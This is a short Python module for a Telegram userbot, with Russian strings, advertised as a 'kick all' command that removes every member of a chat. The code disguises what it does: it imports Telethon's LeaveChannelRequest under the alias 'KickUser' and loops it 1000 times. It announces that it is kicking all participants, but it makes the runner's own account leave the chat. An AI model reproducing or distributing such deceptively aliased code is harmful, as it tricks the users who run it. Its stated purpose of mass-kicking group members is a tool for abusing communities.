from .. import loader, utils
from asyncio import sleep
from telethon.tl.types import ChatBannedRights
from telethon.tl.functions.channels import EditBannedRequest
from telethon.tl.functions.channels import LeaveChannelRequest as KickUser
from userbot import bot
def register(cb):
    cb(KickallMod())
class KickallMod(loader.Module):
    """Согласен"""
    strings = {'name': 'кикалл ауе. *Приват* @guslslakkaakdkab'}
    async def kickallcmd(self, event):
        await event.edit("кикаем всех участников")
        await sleep(1)
        chatid = await event.client.get_entity(event.to_id)
        for i in range(1000):
            await sleep(1)
            try:
                await bot(KickUser(chatid.id))
            except:
                await sleep(1)